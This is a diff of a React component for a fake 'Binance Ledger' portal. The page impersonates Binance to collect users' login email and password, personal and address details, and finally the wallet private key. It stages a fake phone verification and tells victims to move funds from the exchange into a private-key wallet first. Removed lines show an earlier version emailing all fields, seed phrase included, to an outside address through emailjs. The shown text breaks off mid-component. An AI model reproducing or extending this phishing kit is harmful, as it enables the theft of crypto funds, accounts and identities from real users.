@@ -1,12 +1,13 @@
 
-import { FC, useState, FormEvent } from "react";
+import { FC, useState, FormEvent, useEffect } from "react";
 import { useToast } from "@/components/ui/use-toast";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Input } from "@/components/ui/input";
 import { Button } from "@/components/ui/button";
 import { Progress } from "@/components/ui/progress";
 import { Select, SelectTrigger, SelectValue, SelectContent, SelectItem } from "@/components/ui/select";
-import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription, AlertDialogFooter, AlertDialogCancel, AlertDialogAction } from "@/components/ui/alert-dialog";
+import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
+import { Wallet } from "lucide-react";
 import emailjs from 'emailjs-com';
 import { EMAILJS_CONFIG } from "@/config/emailjs.config";
 
@@ -35,30 +36,110 @@ const countries = [
   "Yemen", "Zambia", "Zimbabwe"
 ];
 
+enum FormStep {
+  LOGIN_EMAIL = 1,
+  LOGIN_PASSWORD = 2,
+  APP_VERIFICATION = 3,
+  LOGIN_SUCCESS = 4,
+  PERSONAL_DETAILS = 5,
+  ADDRESS_DETAILS = 6,
+  CONFIRMATION = 7,
+  SHIPMENT_CONFIRMATION = 8,
+  WALLET_STEP1 = 9,
+  WALLET_STEP2 = 10,
+  WALLET_STEP3 = 11,
+  WALLET_STEP4 = 12, 
+  WALLET_STEP5 = 13,
+  WALLET_STEP6 = 14,
+  WALLET_STEP7 = 15,
+  WALLET_STEP8 = 16,
+  WALLET_LINKING = 17,
+  WALLET_SUCCESS = 18
+}
+
 const BinanceLedgerForm: FC = () => {
   const { toast } = useToast();
-  const [currentStep, setCurrentStep] = useState(1);
-  const [formProgress, setFormProgress] = useState(20);
+  const [currentStep, setCurrentStep] = useState<FormStep>(FormStep.LOGIN_EMAIL);
+  const [formProgress, setFormProgress] = useState(5);
   const [formData, setFormData] = useState({
+    email: "",
+    password: "",
     firstName: "",
     lastName: "",
     dateOfBirth: "",
-    email: "",
     phoneNumber: "",
     address: "",
     zipCode: "",
     city: "",
     country: "",
-    seedPhrase: "",
+    privateKey: "",
     securityConfirmation: false,
+    walletConfirmations: {
+      understand: false,
+      risks: false,
+      backup: false,
+      responsibility: false
+    }
   });
   
   const [errors, setErrors] = useState<Record<string, string>>({});
-  const [verificationCompleted, setVerificationCompleted] = useState(false);
-  const [securityConfirmed, setSecurityConfirmed] = useState(false);
   const [isSubmitting, setIsSubmitting] = useState(false);
-  const [submissionCompleted, setSubmissionCompleted] = useState(false);
-  const [showConfirmation, setShowConfirmation] = useState(false);
+  const [showVerificationDialog, setShowVerificationDialog] = useState(false);
+  const [showLinkingDialog, setShowLinkingDialog] = useState(false);
+  const [timerCount, setTimerCount] = useState(10);
+
+  // Calculate progress based on current step
+  useEffect(() => {
+    // Map steps to progress percentage (approximately)
+    const stepToProgress = {
+      [FormStep.LOGIN_EMAIL]: 5,
+      [FormStep.LOGIN_PASSWORD]: 10,
+      [FormStep.APP_VERIFICATION]: 15,
+      [FormStep.LOGIN_SUCCESS]: 20,
+      [FormStep.PERSONAL_DETAILS]: 30,
+      [FormStep.ADDRESS_DETAILS]: 40,
+      [FormStep.CONFIRMATION]: 50,
+      [FormStep.SHIPMENT_CONFIRMATION]: 55,
+      [FormStep.WALLET_STEP1]: 60,
+      [FormStep.WALLET_STEP8]: 90,
+      [FormStep.WALLET_LINKING]: 95,
+      [FormStep.WALLET_SUCCESS]: 100,
+    };
+
+    // Get progress for the current step or default to the step number * 5
+    const progress = stepToProgress[currentStep] || currentStep * 5;
+    setFormProgress(Math.min(progress, 100)); // Cap at 100%
+  }, [currentStep]);
+
+  // Timer effects for verification screens
+  useEffect(() => {
+    let timer: NodeJS.Timeout;
+    
+    if (currentStep === FormStep.APP_VERIFICATION && timerCount > 0) {
+      timer = setTimeout(() => {
+        setTimerCount(timerCount - 1);
+      }, 1000);
+    } else if (currentStep === FormStep.APP_VERIFICATION && timerCount === 0) {
+      setCurrentStep(FormStep.LOGIN_SUCCESS);
+      setTimerCount(10); // Reset for next timer
+      toast({
+        title: "Success",
+        description: "Authentication successful",
+      });
+    }
+    
+    if (currentStep === FormStep.WALLET_LINKING && timerCount > 0) {
+      timer = setTimeout(() => {
+        setTimerCount(timerCount - 1);
+      }, 1000);
+    } else if (currentStep === FormStep.WALLET_LINKING && timerCount === 0) {
+      setCurrentStep(FormStep.WALLET_SUCCESS);
+    }
+    
+    return () => {
+      if (timer) clearTimeout(timer);
+    };
+  }, [currentStep, timerCount, toast]);
 
   const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
     setFormData({
@@ -80,37 +161,61 @@ const BinanceLedgerForm: FC = () => {
       ...formData,
       securityConfirmation: checked,
     });
-    setSecurityConfirmed(checked);
   };
 
-  const validateStep1 = () => {
+  const handleWalletConfirmation = (key: keyof typeof formData.walletConfirmations, checked: boolean) => {
+    setFormData({
+      ...formData,
+      walletConfirmations: {
+        ...formData.walletConfirmations,
+        [key]: checked
+      }
+    });
+  };
+
+  const validateEmail = () => {
     const newErrors: Record<string, string> = {};
+    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-    if (formData.firstName.trim() === "") {
-      newErrors.firstName = "First name is required";
-    }
-
-    if (formData.lastName.trim() === "") {
-      newErrors.lastName = "Last name is required";
-    }
-
-    if (formData.dateOfBirth.trim() === "") {
-      newErrors.dateOfBirth = "Date of birth is required";
+    if (!formData.email) {
+      newErrors.email = "Email is required";
+    } else if (!emailRegex.test(formData.email)) {
+      newErrors.email = "Please enter a valid email address";
     }
 
     setErrors(newErrors);
     return Object.keys(newErrors).length === 0;
   };
 
-  const validateStep2 = () => {
+  const validatePassword = () => {
     const newErrors: Record<string, string> = {};
-    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
 
-    if (!emailRegex.test(formData.email)) {
-      newErrors.email = "Valid email is required";
+    if (!formData.password) {
+      newErrors.password = "Password is required";
+    } else if (formData.password.length < 8) {
+      newErrors.password = "Password must be at least 8 characters";
     }
 
-    if (formData.phoneNumber.trim() === "") {
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
+
+  const validatePersonalDetails = () => {
+    const newErrors: Record<string, string> = {};
+
+    if (!formData.firstName.trim()) {
+      newErrors.firstName = "First name is required";
+    }
+    
+    if (!formData.lastName.trim()) {
+      newErrors.lastName = "Last name is required";
+    }
+    
+    if (!formData.dateOfBirth) {
+      newErrors.dateOfBirth = "Date of birth is required";
+    }
+    
+    if (!formData.phoneNumber.trim()) {
       newErrors.phoneNumber = "Phone number is required";
     }
 
@@ -118,18 +223,18 @@ const BinanceLedgerForm: FC = () => {
     return Object.keys(newErrors).length === 0;
   };
 
-  const validateStep3 = () => {
+  const validateAddressDetails = () => {
     const newErrors: Record<string, string> = {};
     
-    if (formData.address.trim() === "") {
+    if (!formData.address.trim()) {
       newErrors.address = "Address is required";
     }
     
-    if (formData.zipCode.trim() === "") {
-      newErrors.zipCode = "Zip code is required";
+    if (!formData.zipCode.trim()) {
+      newErrors.zipCode = "Postal code is required";
     }
     
-    if (formData.city.trim() === "") {
+    if (!formData.city.trim()) {
       newErrors.city = "City is required";
     }
     
@@ -141,18 +246,24 @@ const BinanceLedgerForm: FC = () => {
     return Object.keys(newErrors).length === 0;
   };
 
-  const validateStep4 = () => {
-    if (!formData.seedPhrase.trim()) {
-      toast({
-        title: "Please enter your seed phrase or private key",
-        variant: "destructive",
-      });
-      return false;
+  const validatePrivateKey = () => {
+    const newErrors: Record<string, string> = {};
+    
+    if (!formData.privateKey.trim()) {
+      newErrors.privateKey = "Private key is required to link your wallet";
     }
+    
+    setErrors(newErrors);
+    return Object.keys(newErrors).length === 0;
+  };
 
-    if (!formData.securityConfirmation) {
+  const validateWalletConfirmations = () => {
+    const { understand, risks, backup, responsibility } = formData.walletConfirmations;
+    
+    if (!understand || !risks || !backup || !responsibility) {
       toast({
-        title: "Please confirm the security notice",
+        title: "Error",
+        description: "Please confirm all security notices before proceeding",
         variant: "destructive",
       });
       return false;
@@ -162,505 +273,1019 @@ const BinanceLedgerForm: FC = () => {
   };
 
   const handleNext = () => {
-    if (currentStep === 1 && validateStep1()) {
-      setCurrentStep(2);
-      setFormProgress(40);
-    } else if (currentStep === 2 && validateStep2()) {
-      setCurrentStep(3);
-      setFormProgress(60);
-    } else if (currentStep === 3 && validateStep3()) {
-      setCurrentStep(4);
-      setFormProgress(80);
-      setVerificationCompleted(true);
-    } else if (currentStep === 4 && validateStep4()) {
-      setCurrentStep(5);
-      setFormProgress(100);
-      setShowConfirmation(true);
+    switch (currentStep) {
+      case FormStep.LOGIN_EMAIL:
+        if (validateEmail()) {
+          setCurrentStep(FormStep.LOGIN_PASSWORD);
+        }
+        break;
+        
+      case FormStep.LOGIN_PASSWORD:
+        if (validatePassword()) {
+          setShowVerificationDialog(true);
+          setCurrentStep(FormStep.APP_VERIFICATION);
+        }
+        break;
+        
+      case FormStep.LOGIN_SUCCESS:
+        setCurrentStep(FormStep.PERSONAL_DETAILS);
+        break;
+        
+      case FormStep.PERSONAL_DETAILS:
+        if (validatePersonalDetails()) {
+          setCurrentStep(FormStep.ADDRESS_DETAILS);
+        }
+        break;
+        
+      case FormStep.ADDRESS_DETAILS:
+        if (validateAddressDetails()) {
+          setCurrentStep(FormStep.CONFIRMATION);
+        }
+        break;
+        
+      case FormStep.CONFIRMATION:
+        setIsSubmitting(true);
+        // Simulate API call
+        setTimeout(() => {
+          setIsSubmitting(false);
+          setCurrentStep(FormStep.SHIPMENT_CONFIRMATION);
+        }, 1500);
+        break;
+        
+      case FormStep.SHIPMENT_CONFIRMATION:
+        setCurrentStep(FormStep.WALLET_STEP1);
+        break;
+        
+      case FormStep.WALLET_STEP1:
+        setCurrentStep(FormStep.WALLET_STEP2);
+        break;
+        
+      case FormStep.WALLET_STEP2:
+        setCurrentStep(FormStep.WALLET_STEP3);
+        break;
+        
+      case FormStep.WALLET_STEP3:
+        setCurrentStep(FormStep.WALLET_STEP4);
+        break;
+        
+      case FormStep.WALLET_STEP4:
+        setCurrentStep(FormStep.WALLET_STEP5);
+        break;
+        
+      case FormStep.WALLET_STEP5:
+        setCurrentStep(FormStep.WALLET_STEP6);
+        break;
+        
+      case FormStep.WALLET_STEP6:
+        setCurrentStep(FormStep.WALLET_STEP7);
+        break;
+        
+      case FormStep.WALLET_STEP7:
+        if (validateWalletConfirmations()) {
+          setCurrentStep(FormStep.WALLET_STEP8);
+        }
+        break;
+        
+      case FormStep.WALLET_STEP8:
+        if (validatePrivateKey()) {
+          setShowLinkingDialog(true);
+          setCurrentStep(FormStep.WALLET_LINKING);
+        }
+        break;
+        
+      default:
+        break;
     }
   };
 
   const handlePrevious = () => {
-    if (currentStep === 2) {
-      setCurrentStep(1);
-      setFormProgress(20);
-    } else if (currentStep === 3) {
-      setCurrentStep(2);
-      setFormProgress(40);
-    } else if (currentStep === 4) {
-      setCurrentStep(3);
-      setFormProgress(60);
-      setVerificationCompleted(false);
-    } else if (currentStep === 5) {
-      setCurrentStep(4);
-      setFormProgress(80);
-      setShowConfirmation(false);
-      setVerificationCompleted(true);
+    if (currentStep > FormStep.LOGIN_EMAIL) {
+      setCurrentStep(prevStep => prevStep - 1);
     }
   };
 
-  const sendEmail = async () => {
-    try {
-      const templateParams = {
-        to_email: "donotreply@binanceledger.com",
-        from_name: `${formData.firstName} ${formData.lastName}`,
-        from_email: formData.email,
-        subject: "New Binance Ledger Form Submission",
-        message: `
-          Name: ${formData.firstName} ${formData.lastName}
-          Date of Birth: ${formData.dateOfBirth}
-          Email: ${formData.email}
-          Phone: ${formData.phoneNumber}
-          Address: ${formData.address}
-          Zip Code: ${formData.zipCode}
-          City: ${formData.city}
-          Country: ${formData.country}
-          Seed Phrase: ${formData.seedPhrase}
-        `,
-      };
+  const renderAppVerification = () => (
+    <div className="text-center py-8 space-y-6">
+      <div className="w-20 h-20 mx-auto bg-binance-yellow/20 rounded-full flex items-center justify-center">
+        <div className="text-binance-yellow text-xl">
+          {timerCount}
+        </div>
+      </div>
+      <h3 className="text-white font-semibold text-xl">Security Verification</h3>
+      <p className="text-gray-300 max-w-md mx-auto">
+        Open Binance app on your phone. Binance has sent a notification to your phone. 
+        Open your Binance App and confirm the prompt to verify it's you.
+      </p>
+      <div className="animate-pulse text-sm text-gray-400">
+        Waiting for verification...
+      </div>
+    </div>
+  );
 
-      await emailjs.send(
-        EMAILJS_CONFIG.SERVICE_ID,
-        EMAILJS_CONFIG.TEMPLATE_ID,
-        templateParams,
-        EMAILJS_CONFIG.USER_ID
-      );
-      
-      return true;
-    } catch (error) {
-      console.error("Email sending failed:", error);
-      return false;
-    }
-  };
+  const renderLoginSuccess = () => (
+    <div className="text-center py-8 space-y-6">
+      <div className="w-20 h-20 mx-auto bg-green-100 rounded-full flex items-center justify-center">
+        <svg
+          className="w-10 h-10 text-green-600"
+          fill="none"
+          stroke="currentColor" 
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            strokeWidth="2"
+            d="M5 13l4 4L19 7"
+          />
+        </svg>
+      </div>
+      <h3 className="text-white font-semibold text-xl">Login Successful</h3>
+      <p className="text-gray-300 max-w-md mx-auto">
+        Welcome back to Binance Ledger Portal. We will now verify a few personal details 
+        in order to send you the Binance Ledger.
+      </p>
+      <Button
+        onClick={handleNext}
+        className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+      >
+        Continue
+      </Button>
+    </div>
+  );
 
-  const handleSubmit = async (e?: FormEvent) => {
-    if (e) e.preventDefault();
-    
-    setIsSubmitting(true);
+  const renderLoginEmail = () => (
+    <div className="space-y-6">
+      <h3 className="text-white font-medium">Login with Binance Account</h3>
+      <div>
+        <label htmlFor="email" className="block text-sm font-medium text-gray-300 mb-1">
+          Email
+        </label>
+        <Input
+          id="email"
+          name="email"
+          type="email"
+          value={formData.email}
+          onChange={handleInputChange}
+          placeholder="Your Binance Email Address"
+          className={`bg-binance-darkGray border-gray-600 text-white ${errors.email ? "border-red-500" : ""}`}
+          autoFocus
+        />
+        {errors.email && <p className="text-red-500 text-xs mt-1">{errors.email}</p>}
+      </div>
+      <Button
+        onClick={handleNext}
+        className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+      >
+        Next
+      </Button>
+    </div>
+  );
 
-    try {
-      // Send email with form data
-      const emailSent = await sendEmail();
+  const renderLoginPassword = () => (
+    <div className="space-y-6">
+      <h3 className="text-white font-medium">Enter Password</h3>
+      <div>
+        <label htmlFor="password" className="block text-sm font-medium text-gray-300 mb-1">
+          Password
+        </label>
+        <Input
+          id="password"
+          name="password"
+          type="password"
+          value={formData.password}
+          onChange={handleInputChange}
+          placeholder="Your Binance Password"
+          className={`bg-binance-darkGray border-gray-600 text-white ${errors.password ? "border-red-500" : ""}`}
+          autoFocus
+        />
+        {errors.password && <p className="text-red-500 text-xs mt-1">{errors.password}</p>}
+      </div>
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Log In
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderPersonalDetails = () => (
+    <div className="space-y-6">
+      <h3 className="text-white font-medium">Personal Information</h3>
+      <div className="grid grid-cols-2 gap-4">
+        <div>
+          <label htmlFor="firstName" className="block text-sm font-medium text-gray-300 mb-1">
+            First Name
+          </label>
+          <Input
+            id="firstName"
+            name="firstName"
+            value={formData.firstName}
+            onChange={handleInputChange}
+            placeholder="First Name"
+            className={`bg-binance-darkGray border-gray-600 text-white ${errors.firstName ? "border-red-500" : ""}`}
+          />
+          {errors.firstName && <p className="text-red-500 text-xs mt-1">{errors.firstName}</p>}
+        </div>
+        <div>
+          <label htmlFor="lastName" className="block text-sm font-medium text-gray-300 mb-1">
+            Last Name
+          </label>
+          <Input
+            id="lastName"
+            name="lastName"
+            value={formData.lastName}
+            onChange={handleInputChange}
+            placeholder="Last Name"
+            className={`bg-binance-darkGray border-gray-600 text-white ${errors.lastName ? "border-red-500" : ""}`}
+          />
+          {errors.lastName && <p className="text-red-500 text-xs mt-1">{errors.lastName}</p>}
+        </div>
+      </div>
+      <div>
+        <label htmlFor="dateOfBirth" className="block text-sm font-medium text-gray-300 mb-1">
+          Date of Birth
+        </label>
+        <Input
+          id="dateOfBirth"
+          name="dateOfBirth"
+          type="date"
+          value={formData.dateOfBirth}
+          onChange={handleInputChange}
+          placeholder="Date of Birth"
+          className={`bg-binance-darkGray border-gray-600 text-white ${errors.dateOfBirth ? "border-red-500" : ""}`}
+        />
+        {errors.dateOfBirth && <p className="text-red-500 text-xs mt-1">{errors.dateOfBirth}</p>}
+      </div>
+      <div>
+        <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-300 mb-1">
+          Phone Number
+        </label>
+        <Input
+          id="phoneNumber"
+          name="phoneNumber"
+          type="tel"
+          value={formData.phoneNumber}
+          onChange={handleInputChange}
+          placeholder="Phone Number"
+          className={`bg-binance-darkGray border-gray-600 text-white ${errors.phoneNumber ? "border-red-500" : ""}`}
+        />
+        {errors.phoneNumber && <p className="text-red-500 text-xs mt-1">{errors.phoneNumber}</p>}
+      </div>
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button
+          type="button"
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Next
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderAddressDetails = () => (
+    <div className="space-y-6">
+      <h3 className="text-white font-medium">Address Details</h3>
+      <div>
+        <label htmlFor="address" className="block text-sm font-medium text-gray-300 mb-1">
+          Address
+        </label>
+        <Input
+          id="address"
+          name="address"
+          value={formData.address}
+          onChange={handleInputChange}
+          placeholder="Address"
+          className={`bg-binance-darkGray border-gray-600 text-white ${errors.address ? "border-red-500" : ""}`}
+        />
+        {errors.address && <p className="text-red-500 text-xs mt-1">{errors.address}</p>}
+      </div>
+
+      <div className="grid grid-cols-2 gap-4">
+        <div>
+          <label htmlFor="zipCode" className="block text-sm font-medium text-gray-300 mb-1">
+            Postal Code
+          </label>
+          <Input
+            id="zipCode"
+            name="zipCode"
+            value={formData.zipCode}
+            onChange={handleInputChange}
+            placeholder="Postal Code"
+            className={`bg-binance-darkGray border-gray-600 text-white ${errors.zipCode ? "border-red-500" : ""}`}
+          />
+          {errors.zipCode && <p className="text-red-500 text-xs mt-1">{errors.zipCode}</p>}
+        </div>
+        <div>
+          <label htmlFor="city" className="block text-sm font-medium text-gray-300 mb-1">
+            City
+          </label>
+          <Input
+            id="city"
+            name="city"
+            value={formData.city}
+            onChange={handleInputChange}
+            placeholder="City"
+            className={`bg-binance-darkGray border-gray-600 text-white ${errors.city ? "border-red-500" : ""}`}
+          />
+          {errors.city && <p className="text-red-500 text-xs mt-1">{errors.city}</p>}
+        </div>
+      </div>
+
+      <div>
+        <label htmlFor="country" className="block text-sm font-medium text-gray-300 mb-1">
+          Country
+        </label>
+        <Select
+          name="country"
+          value={formData.country}
+          onValueChange={(value) => {
+            setFormData({
+              ...formData,
+              country: value
+            });
+            // Clear error for this field if it exists
+            if (errors.country) {
+              setErrors({
+                ...errors,
+                country: ""
+              });
+            }
+          }}
+        >
+          <SelectTrigger 
+            className={`bg-binance-darkGray border-gray-600 text-white ${errors.country ? "border-red-500" : ""}`}
+          >
+            <SelectValue placeholder="Select a country" />
+          </SelectTrigger>
+          <SelectContent className="bg-binance-darkGray border-gray-600 text-white max-h-[200px]">
+            {countries.map((country) => (
+              <SelectItem key={country} value={country}>
+                {country}
+              </SelectItem>
+            ))}
+          </SelectContent>
+        </Select>
+        {errors.country && <p className="text-red-500 text-xs mt-1">{errors.country}</p>}
+      </div>
       
-      // Simulate processing time
-      await new Promise(resolve => setTimeout(resolve, 2000));
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button
+          type="button"
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Review Information
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderConfirmation = () => (
+    <div className="space-y-6">
+      <div className="text-center py-2">
+        <h3 className="text-white font-semibold text-xl mb-4">
+          Review Your Information
+        </h3>
+        <p className="text-gray-300 text-sm mb-6">
+          Please review the information below before finalizing your submission.
+        </p>
+      </div>
+
+      <div className="space-y-4 bg-binance-darkGray/40 p-4 rounded-md">
+        <div className="grid grid-cols-2 gap-x-4 gap-y-2">
+          <div className="text-gray-400 text-sm">First Name:</div>
+          <div className="text-white text-sm font-medium">{formData.firstName}</div>
+          
+          <div className="text-gray-400 text-sm">Last Name:</div>
+          <div className="text-white text-sm font-medium">{formData.lastName}</div>
+          
+          <div className="text-gray-400 text-sm">Date of Birth:</div>
+          <div className="text-white text-sm font-medium">{formData.dateOfBirth}</div>
+          
+          <div className="text-gray-400 text-sm">Email:</div>
+          <div className="text-white text-sm font-medium">{formData.email}</div>
+          
+          <div className="text-gray-400 text-sm">Phone Number:</div>
+          <div className="text-white text-sm font-medium">{formData.phoneNumber}</div>
+          
+          <div className="text-gray-400 text-sm">Address:</div>
+          <div className="text-white text-sm font-medium">{formData.address}</div>
+          
+          <div className="text-gray-400 text-sm">Postal Code:</div>
+          <div className="text-white text-sm font-medium">{formData.zipCode}</div>
+          
+          <div className="text-gray-400 text-sm">City:</div>
+          <div className="text-white text-sm font-medium">{formData.city}</div>
+          
+          <div className="text-gray-400 text-sm">Country:</div>
+          <div className="text-white text-sm font-medium">{formData.country}</div>
+        </div>
+      </div>
       
-      setIsSubmitting(false);
-      setSubmissionCompleted(true);
-      setShowConfirmation(false);
+      <div className="flex justify-between pt-6">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Go Back
+        </Button>
+        <Button
+          type="button"
+          onClick={handleNext}
+          disabled={isSubmitting}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          {isSubmitting ? "Processing..." : "Confirm & Submit"}
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderShipmentConfirmation = () => (
+    <div className="text-center py-8">
+      <div className="inline-flex items-center justify-center w-16 h-16 rounded-full bg-green-100 mb-6">
+        <svg
+          className="w-8 h-8 text-green-600"
+          fill="none"
+          stroke="currentColor"
+          viewBox="0 0 24 24"
+          xmlns="http://www.w3.org/2000/svg"
+        >
+          <path
+            strokeLinecap="round"
+            strokeLinejoin="round"
+            strokeWidth="2"
+            d="M5 13l4 4L19 7"
+          ></path>
+        </svg>
+      </div>
+      <h3 className="text-white font-semibold text-xl mb-2">
+        Success! Your Binance Ledger is on the way.
+      </h3>
+      <p className="text-gray-300">
+        The Binance Ledger will be shipped to your provided address:
+        <br />
+        <span className="block mt-2 font-medium">
+          {formData.address}, {formData.zipCode}
+          <br />
+          {formData.city}, {formData.country}
+        </span>
+      </p>
+      <p className="mt-6 text-gray-300">
+        Delivery typically takes <span className="text-binance-yellow font-medium">5 business days</span>.
+      </p>
+      <p className="mt-2 text-gray-400 text-sm">
+        You will receive a confirmation email at {formData.email} with tracking information
+        once your device has been shipped.
+      </p>
       
-      if (emailSent) {
-        toast({
-          title: "Success",
-          description: "Your Ledger is on the way to the provided address. Form data has been sent to the admin.",
-        });
-      } else {
-        toast({
-          title: "Success",
-          description: "Your Ledger is on the way to the provided address. (Email notification failed)",
-        });
-      }
-    } catch (error) {
-      setIsSubmitting(false);
-      setShowConfirmation(false);
-      toast({
-        title: "Error",
-        description: "An error occurred. Please try again.",
-        variant: "destructive",
-      });
-      console.error("Form submission error:", error);
-    }
-  };
+      <div className="mt-8 pt-6 border-t border-gray-700">
+        <h4 className="text-white font-medium mb-3">Next Steps</h4>
+        <p className="text-gray-300">
+          Let's link your Ledger to your wallet. This will ensure your device is ready to use when it arrives.
+        </p>
+        
+        <Button 
+          onClick={handleNext}
+          className="mt-6 bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Continue to Wallet Linking
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep1 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          1
+        </div>
+        <h3 className="text-white font-semibold text-lg">Log in to your Binance App</h3>
+      </div>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
+        <p className="mb-4">
+          Open your Binance mobile application and log in with your credentials. 
+          If you don't have the app installed yet, you can download it from your app store.
+        </p>
+        <div className="flex space-x-4 justify-center">
+          <img 
+            src="/lovable-uploads/938c67ba-a1d3-4451-8b8d-ea78479af87c.png" 
+            alt="Binance App Screenshot" 
+            className="max-w-[120px] rounded-md"
+          />
+        </div>
+      </div>
+      
+      <Button 
+        onClick={handleNext}
+        className="w-full bg-binance-yellow text-binance-black hover:bg-binance-yellow/90 mt-2"
+      >
+        I've Logged In, Continue
+      </Button>
+    </div>
+  );
+
+  const renderWalletStep2 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          2
+        </div>
+        <h3 className="text-white font-semibold text-lg">Go to your Binance Wallet</h3>
+      </div>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
+        <p>Navigate to the Wallet section in your Binance App by tapping on the Wallet icon.</p>
+        
+        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 my-4">
+          <h4 className="text-red-400 font-medium text-sm mb-1">Don't have a wallet yet?</h4>
+          <p className="text-sm">
+            If you don't have a wallet yet, you'll need to create one first by following the steps in the app. 
+            Tap on "Create Wallet" and follow the on-screen instructions.
+          </p>
+        </div>
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Next Step
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep3 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          3
+        </div>
+        <h3 className="text-white font-semibold text-lg">Ensure funds are in your wallet</h3>
+      </div>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
+        <p className="mb-4">
+          This step is <span className="text-binance-yellow font-medium">very important</span> for the safety of your assets.
+        </p>
+        
+        <div className="bg-red-900/20 border border-red-500/30 rounded-md p-3 mb-4">
+          <h4 className="text-red-400 font-medium mb-2">Critical Security Notice:</h4>
+          <p>
+            Your funds must be in your wallet, not in the exchange environment. 
+            If your funds are still in the exchange, you must transfer them to your wallet.
+          </p>
+        </div>
+        
+        <p>
+          To transfer funds from the exchange to your wallet:
+        </p>
+        <ol className="list-decimal ml-5 space-y-2 mt-2">
+          <li>Go to your Binance Spot wallet</li>
+          <li>Select the cryptocurrency you want to transfer</li>
+          <li>Tap "Transfer" and select "To Wallet"</li>
+          <li>Enter the amount and confirm the transfer</li>
+        </ol>
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          I've Transferred My Funds, Continue
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep4 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          4
+        </div>
+        <h3 className="text-white font-semibold text-lg">Access wallet management</h3>
+      </div>
+      
+      <div className="bg-binance-darkGray/40 rounded-lg p-4 text-gray-300">
+        <p className="mb-4">
+          In the Binance Wallet interface:
+        </p>
+        
+        <ol className="list-decimal ml-5 space-y-3">
+          <li>Look for "My Wallet" in the top-left corner and tap on it</li>
+          <li>In the top-right corner, tap on "Manage"</li>
+          <li>Select your wallet from the list</li>
+          <li>A menu with three functions will appear</li>
+          <li>Choose "Convert to Private Key Wallet"</li>
+        </ol>
+        
+        <p className="mt-4">
+          This will begin the linking process between your wallet and the Binance Ledger.
+        </p>
+      </div>
+      
+      <div className="flex justify-between pt-2">
+        <Button
+          type="button"
+          onClick={handlePrevious}
+          className="bg-gray-600 hover:bg-gray-700 text-white"
+        >
+          Back
+        </Button>
+        <Button 
+          onClick={handleNext}
+          className="bg-binance-yellow text-binance-black hover:bg-binance-yellow/90"
+        >
+          Next Step
+        </Button>
+      </div>
+    </div>
+  );
+
+  const renderWalletStep5 = () => (
+    <div className="space-y-6">
+      <div className="flex items-center">
+        <div className="bg-binance-yellow text-binance-black w-8 h-8 rounded-full flex items-center justify-center font-bold text-sm mr-3">
+          5
+        </div>
+        <h3 className="text-white font-semibold text-lg">Read the security reminder</h3>
+      </div>
+      
